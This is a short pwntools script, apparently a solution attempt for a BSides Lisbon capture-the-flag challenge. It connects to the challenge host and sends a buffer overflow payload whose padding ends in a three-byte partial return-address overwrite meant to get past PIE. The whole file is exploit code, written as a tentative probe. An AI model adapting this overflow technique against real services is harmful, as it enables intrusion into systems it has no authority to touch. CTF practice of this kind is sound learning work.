#!/usr/bin/env python3

from pwn import *

context.update(arch='amd64', os='linux')

HOST = "7b44d3bf-0008-4576-b715-b08d8cb090b7-lmao.challs.bsideslisbon.org"
PORT = 20298

# Try with the most common PIE base
r = remote(HOST, PORT)
r.recvuntil(b"You say: ")

# Simple payload - just try to crash it controlled
payload = b"LMAO"
payload += b"A" * 28
payload += b"B" * 8

# Try just the offset (partial overwrite of 3 bytes)
payload += b"\xa9\x11\x55"  # Most common: 0x5555...11a9

r.sendline(payload)

# See what happens
print("Response:", r.recvall(timeout=2))
